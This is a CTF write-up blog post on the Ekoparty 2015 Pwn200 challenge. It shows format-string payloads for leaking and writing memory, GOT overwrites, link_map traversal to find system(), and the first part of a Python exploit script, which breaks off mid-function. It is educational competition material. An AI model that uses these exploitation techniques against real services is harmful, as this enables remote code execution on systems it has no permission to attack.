
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Ekoparty - Pwn200 - staring into /dev/null</title>
  <meta name="author" content="barrebas">

  
  <meta name="description" content="Where on earth shall we begin? This one kept us busy for quite some time. The challenge gives no binary, just an address to connect to. Upon &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">staring into /dev/null</a></h1>
  
    <h2>barrebas</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:barrebas.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Ekoparty - Pwn200</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-09-21T23:47:44+02:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>11:47 pm</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>Where on earth shall we begin? This one kept us busy for quite some time. The challenge gives no binary, just an address to connect to. Upon connecting, we get some kind of echo server. We quickly noticed a string format vulnerability:</p>

<!--more-->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc challs.ctf.site 20002
</span><span class='line'>&lt;Simple loop greetings v1.3.3.7&gt;
</span><span class='line'>[!] Type bye to quit
</span><span class='line'>Enter your name: %17$s
</span><span class='line'>Hi 3k0_p4rty_2015!</span></code></pre></td></tr></table></div></figure>


<p>However this wasn&rsquo;t the flag. As we&rsquo;ll see later, this was part of the challenge. We started dumping the entire binary using the string format vuln. Our format string can be found at offset 8 with 1 byte of padding:</p>

<p>bAAAA%8$x</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc challs.ctf.site 20002
</span><span class='line'>&lt;Simple loop greetings v1.3.3.7&gt;
</span><span class='line'>[!] Type bye to quit
</span><span class='line'>Enter your name: bAAAA%8$x
</span><span class='line'>Hi bAAAA41414141</span></code></pre></td></tr></table></div></figure>


<p>From the raw dump, we reconstructed parts of the binary. We came across a string that said &ldquo;OMG! Well done, here&rsquo;s your flag&rdquo; or something along those lines. Looking through the raw dump, we found where that string is referenced. Disassembling with radare2 gave us this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bas@tritonal:~$ rasm2 -d -o 0x13370861 -
</span><span class='line'>7517c7442404970a37138d45e7890424e86afcffff85c074188d45e789442404c704249a0a3713e883fcffffe9a52a2a2ac70424a20a3713e872fcffff8d45e7890424e867fcffffc70424a60a3713e8cbfcffff8d45e789442404c70424a70a3713e828fcffff85c07566c70424c40a3713e838fcffffa10821371389442404c70424c1203713e8f0fdffff8945dca10821371389442404c70424cc2037130cd8fdffff8945e08b4545dc890424e8f6fbffff8b45dc890424
</span><span class='line'>disassemble error at offset 162
</span><span class='line'>jnz 0x1337087a
</span><span class='line'>mov dword [esp+0x4], 0x13370a97
</span><span class='line'>lea eax, [ebp-0x19]
</span><span class='line'>mov [esp], eax
</span><span class='line'>call dword 0x133704e0
</span><span class='line'>test eax, eax
</span><span class='line'>jz 0x13370892
</span><span class='line'>lea eax, [ebp-0x19]
</span><span class='line'>mov [esp+0x4], eax
</span><span class='line'>mov dword [esp], 0x13370a9a ; 
</span><span class='line'>call dword 0x13370510       ; puts? (value in got is 0xb7e76c40)
</span><span class='line'>jmp dword 0x3d613337
</span><span class='line'>mov dword [esp], 0x13370aa2 ; Hi
</span><span class='line'>call dword 0x13370510
</span><span class='line'>lea eax, [ebp-0x19]
</span><span class='line'>mov [esp], eax
</span><span class='line'>call dword 0x13370510
</span><span class='line'>mov dword [esp], 0x13370aa6
</span><span class='line'>call dword 0x13370580       ; ? (value in got is 0xb7e8ec10)
</span><span class='line'>lea eax, [ebp-0x19]
</span><span class='line'>mov [esp+0x4], eax
</span><span class='line'>mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
</span><span class='line'>call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
</span><span class='line'>test eax, eax
</span><span class='line'>jnz 0x13370932
</span><span class='line'>mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
</span><span class='line'>call dword 0x13370510       ; puts?
</span><span class='line'>mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
</span><span class='line'>mov [esp+0x4], eax
</span><span class='line'>mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
</span><span class='line'>call dword 0x133706dd       ; see below
</span><span class='line'>mov [ebp-0x24], eax
</span><span class='line'>mov eax, [0x13372108]
</span><span class='line'>mov [esp+0x4], eax
</span><span class='line'>mov dword [esp], 0x133720cc ; 0x1d0a0c56
</span><span class='line'>or al, 0xd8
</span><span class='line'>std
</span><span class='line'>invalid</span></code></pre></td></tr></table></div></figure>


<p>Since our input can never be larger than 12 bytes, we can never win the strcmp with <code>Welcome to ekoparty 2015</code>. From here, we tried a lot of things. The 12 char input limit was annoying, cos we couldn&rsquo;t really write anything, anywhere:</p>

<p><code>A\xde\xad\xbe\xef%255c%8$hn</code> was 15 chars&hellip; So we set out to make a write() function using the format string vuln.</p>

<p>On the stack, there are many DWORDS. Some of them contain stack addresses. Some of those addresses refer to other stack addresses (they&rsquo;re usually stack frame pointers). Using three memory positions, we could construct a write function using format string argument 25, 61 and 124 (ASLR is off so the addresses remain constant). Here&rsquo;s how:</p>

<p>$25 contains the address of $61. Let&rsquo;s assume $25 contains 0xfffff080.</p>

<p>$61 is at 0xfffff080 and contains 0xfffff1a0, which is $124 (math doesn&rsquo;t work out but bear with me).</p>

<p>$124 contains nothing of interest, and isn&rsquo;t used by the binary.</p>

<p>If we now use the format string, we use $61 to write to $124, and $25 to update $61. Finally, once we&rsquo;ve written out an address in $124, we can use the format string to write to that location.</p>

<p>Let&rsquo;s assume we want to write 0x41414141 to 0x804b020. We first do this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>%32c%61$hhn (write 0x20 to 0xfffff1a0). </span></code></pre></td></tr></table></div></figure>


<p>Then, we update the pointer at $61 by writing to $25:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>%161c%25$hhn</span></code></pre></td></tr></table></div></figure>


<p>So $61 will now contain 0xfffff1a1. Then we write to $124 again via $61:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>%176c%61$hhn (write 0xb0 to 0xfffff1a1). </span></code></pre></td></tr></table></div></figure>


<p>Etc until we have 0x804b020 at $124. Then we write using $124:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>%65c%124$hhn</span></code></pre></td></tr></table></div></figure>


<p>And we&rsquo;ll have written the first byte to 0x804b020. We repeat this process for the other bytes&hellip;</p>

<p>With our new and shiny write() function we set out to break this challenge. We first tried truncating the string &ldquo;Welcome to ekoparty 2015!&rdquo; in memory, so we could have an input that would fit the 12 char limit. Writing to that location didn&rsquo;t work, presumably cos that string was in non-writeable memory. Remember, we needed to enter the code path here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
</span><span class='line'>call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
</span><span class='line'>test eax, eax
</span><span class='line'>jnz 0x13370932
</span><span class='line'>mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
</span><span class='line'>call dword 0x13370510       ; puts?
</span><span class='line'>mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
</span><span class='line'>mov [esp+0x4], eax
</span><span class='line'>mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
</span><span class='line'>call dword 0x133706dd       ; see below
</span><span class='line'>mov [ebp-0x24], eax
</span><span class='line'>mov eax, [0x13372108]
</span><span class='line'>mov [esp+0x4], eax
</span><span class='line'>mov dword [esp], 0x133720cc ; 0x1d0a0c56</span></code></pre></td></tr></table></div></figure>


<p>We dumped and reversed the function at <code>0x133720cc</code>, which apparently decodes the flag. However, we where only able to get the pieces <code>EKO{</code> and <code>b4by</code>. The dump process wasn&rsquo;t perfect, so we continued.</p>

<p>So how could we get strcmp() to return 0? By overwriting the value in the got with a location that does <code>xor eax, eax; ret</code>. We dumped bytes around the strcmp pointer (ASLR was off so libc was at a static position) and indeed, we identified a rop-like gadget that did just that! Careful overwriting of the got pointer of strcmp in two steps was necessary, but again we lucked out: strcmp was at 0xb7f60b60, the <code>xor eax, eax</code> gadget was at 0xb7f61fc4. At 0xb7f61c60, there was this perfect gadget:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>movzx ecx, byte [eax+0x5]
</span><span class='line'>movzx eax, byte [edx+0x5]
</span><span class='line'>sub eax, ecx
</span><span class='line'>ret</span></code></pre></td></tr></table></div></figure>


<p>In two steps, we overwrote strcmp (we can&rsquo;t have the got pointer pointing to illegal instructions, cos that would make the binary crash before we can overwrite the next value!) with the xor eax gadget&hellip; and we got something like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>OMG! nice work, your flag is: EKO{</span></code></pre></td></tr></table></div></figure>


<p>And then nothing?! We overwrote the free() got pointer with puts and this dumped more text, convincing us that the overwrite was working correctly. This lead us to believe the binary was broken&hellip; Which indeed it turned out to be, later on.</p>

<p>Next, loads of failed attempts later, we stumbled upon <a href="https://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/">this writeup of another challenge</a> that uses ret2dl. In other words, abuse the symbol resolver. Quickly after that, we found another good writeup, using a slightly easier technique. It <a href="https://github.com/mrmacete/writeups/tree/master/wapiflapi-exrs/sploit/s7">traverses the link_map</a> found in memory to grab <code>system()</code>.</p>

<p>This turned out to work. We traversed the link_map by hand, adjusting the leaked bytes from time to time (remember, printf chokes on nul bytes).</p>

<p>At the start of the got, we find these bytes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x13371f14 ; .dynamic
</span><span class='line'>0xb7fff938 ; *link_map
</span><span class='line'>0xb7ff24f0 ; *dl-resolve</span></code></pre></td></tr></table></div></figure>


<p>We take 0xb7fff938, the *link_map, and dump from there. link_map looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">link_map</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="cm">/* These first few members are part of the protocol with the debugger.</span>
</span><span class='line'><span class="cm">       This is the same format used in SVR4.  */</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="n">l_addr</span><span class="p">;</span>          <span class="cm">/* Base address shared object is loaded at.  */</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">l_name</span><span class="p">;</span>               <span class="cm">/* Absolute file name object was found in.  */</span>
</span><span class='line'>    <span class="n">ElfW</span><span class="p">(</span><span class="n">Dyn</span><span class="p">)</span> <span class="o">*</span><span class="n">l_ld</span><span class="p">;</span>            <span class="cm">/* Dynamic section of the shared object.  */</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l_next</span><span class="p">,</span> <span class="o">*</span><span class="n">l_prev</span><span class="p">;</span> <span class="cm">/* Chain of loaded objects.  */</span>
</span><span class='line'>  <span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>So at 0xb7fff938 we find:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x746e450a</span> <span class="p">;</span> <span class="n">base_addr</span><span class="p">..</span> <span class="n">not</span> <span class="n">correct</span> <span class="n">due</span> <span class="n">to</span> <span class="n">printf</span>
</span><span class='line'><span class="mh">0xb7fffc24</span> <span class="p">;</span> <span class="n">name</span><span class="o">!</span> <span class="n">empty</span>
</span><span class='line'><span class="mh">0x13371f14</span> <span class="p">;</span> <span class="n">the</span> <span class="n">bin</span> <span class="n">itself</span><span class="p">...</span> <span class="n">not</span> <span class="n">useful</span><span class="p">.</span>
</span><span class='line'><span class="mh">0xb7fffc28</span> <span class="p">;</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">next</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is the binary. On to the next one at 0xb7fffc28, which was linux-gate&hellip; Then the next one was indeed libc! This was confirmed by reading link_map->l_name. We now had the dynamic section of libc, time to parse it for system. Soon, using the printf format string vulnerability and a messy python script, we were dumping symbols. After about an hour, we hit the jackpot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">challs</span><span class="p">.</span><span class="n">ctf</span><span class="p">.</span><span class="n">site</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">20002</span><span class="o">:</span> <span class="n">Done</span>
</span><span class='line'><span class="mh">0xb7e2dec8</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mh">0xb7e2ded8</span> <span class="mh">0x1da8</span>
</span><span class='line'><span class="mi">1768709983</span> <span class="n">__li</span>
</span><span class='line'><span class="mh">0x0</span>
</span><span class='line'><span class="mh">0xb7e2dee8</span> <span class="mh">0xbde</span>
</span><span class='line'><span class="mi">1819570783</span> <span class="n">_rtl</span>
</span><span class='line'><span class="mh">0x0</span>
</span><span class='line'><span class="mh">0xb7e2def8</span> <span class="mh">0x45d1</span>
</span><span class='line'><span class="mi">1768709983</span> <span class="n">__li</span>
</span><span class='line'><span class="mh">0x0</span>
</span><span class='line'><span class="mh">0xb7e2df08</span> <span class="mh">0x13f4</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="mh">0xb7e2f948</span> <span class="mh">0x3176</span>
</span><span class='line'><span class="n">signal</span>
</span><span class='line'><span class="mh">0xb7e2f9a8</span> <span class="mh">0xeab</span>
</span><span class='line'><span class="n">puts</span>
</span><span class='line'><span class="mh">0xb7e30208</span> <span class="mh">0xa3e</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="mh">0xb7e30588</span> <span class="mh">0x3063</span>
</span><span class='line'><span class="n">__libc_system</span>
</span><span class='line'><span class="n">Enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span>
</span><span class='line'><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">found</span> <span class="n">system</span><span class="o">!</span><span class="mh">0x3fcd0</span> <span class="mh">0xb7e69cd0</span>
</span></code></pre></td></tr></table></div></figure>


<p>We had the address of system! Now, the plan of attack was as follows:</p>

<ul>
<li>write <code>/bin/sh</code> to 0x13373008, which gets used in a free() call</li>
<li>overwrite free@got with system</li>
<li>set strcmp to the <code>xor eax, eax; ret</code> gadget</li>
<li>receive shell</li>
</ul>


<p>This <em>almost</em> worked out, but we set strcmp to 0xb7f61f60 and that turned out to be enough. We landed a shell!</p>

<p>The poc we used:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">&#39;linux&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">read1</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">):</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%65c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff941</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..41 to &#39;20&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%66c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff942</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..42 to &#39;37&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
